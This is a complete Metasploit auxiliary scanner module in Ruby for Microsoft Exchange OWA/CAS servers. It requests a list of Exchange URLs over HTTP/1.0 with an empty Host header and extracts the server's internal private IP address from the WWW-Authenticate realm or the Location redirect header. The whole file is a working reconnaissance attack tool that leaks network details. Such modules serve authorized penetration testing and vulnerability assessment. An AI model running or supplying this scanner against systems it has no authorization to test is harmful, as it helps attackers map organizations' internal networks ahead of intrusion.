##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

 include Msf::Exploit::Remote::HttpClient
 include Msf::Auxiliary::Scanner

 def initialize
    super(
      'Name'           => 'Outlook Web App (OWA) / Client Access Server (CAS) IIS HTTP Internal IP Disclosure',
      'Description'    => %q{
        This module tests vulnerable IIS HTTP header file paths on Microsoft
        Exchange OWA 2003 and CAS 2007, 2010, and 2013 servers.
      },
      'Author'         =>
        [
          'Nate Power'
        ],
      'DisclosureDate' => 'Dec 17 2012',
      'License'        => MSF_LICENSE,
      'DefaultOptions' => {
        'SSL' => true
      }
    )

   register_options(
       [
        OptInt.new('TIMEOUT', [ true, "HTTP connection timeout", 10]),
        OptInt.new('RPORT', [ true, "The target port", 443]),
       ])
  end

  def run_host(target_host)
   rhost = target_host
   print_status("#{msg} Checking HTTP headers")
   get_ip_extract
  end

  def get_ip_extract
    urls = ["/Microsoft-Server-ActiveSync/default.eas",
      "/Microsoft-Server-ActiveSync",
      "/Autodiscover/Autodiscover.xml",
      "/Autodiscover",
      "/Exchange",
      "/Rpc",
      "/EWS/Exchange.asmx",
      "/EWS/Services.wsdl",
      "/EWS",
      "/ecp",
      "/OAB",
      "/OWA",
      "/aspnet_client",
      "/PowerShell"]

    result = nil

    urls.each do |url|
      begin
        res = send_request_cgi({
          'version' => "1.0",
          'uri'      => "#{url}",
          'method'   => 'GET',
          'vhost'  =>  ''
        }, timeout = datastore['TIMEOUT'])

      rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
        print_error("#{msg} HTTP Connection Failed")
        next
      end

      if not res
        print_error("#{msg} HTTP Connection Timeout")
        next
      end

      if res and res.code == 401 and (match = res['WWW-Authenticate'].match(/Basic realm=\"(192\.168\.[0-9]{1,3}\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\"/i))
        result = match.captures[0]
        print_status("#{msg} Status Code: 401 response")
        print_status("#{msg} Found Path: " + url )
        print_good("#{msg} Found target internal IP address: " + result)
        return result
       elseif
        print_warning("#{msg} No internal address found")
        next
      end

      if res and (res.code > 300 and res.code < 310) and (match = res['Location'].match(/^https?:\/\/(192\.168\.[0-9]{1,3}\.[0-9]{1,3}|10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}|172\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\//i))
        result = match.captures[0]
        print_status("#{msg} Status Code: #{res.code} response")
        print_status("#{msg} Found Path: " + url )
        print_good("#{msg} Found target internal IP address: " + result)
        return result
       elseif
        print_warning("#{msg} No internal address found")
        next
      end
    end

    if result.nil?
      print_warning("#{msg} Nothing found")
    end

    return result
  end
  def msg
    "#{rhost}:#{rport} -"
  end
end
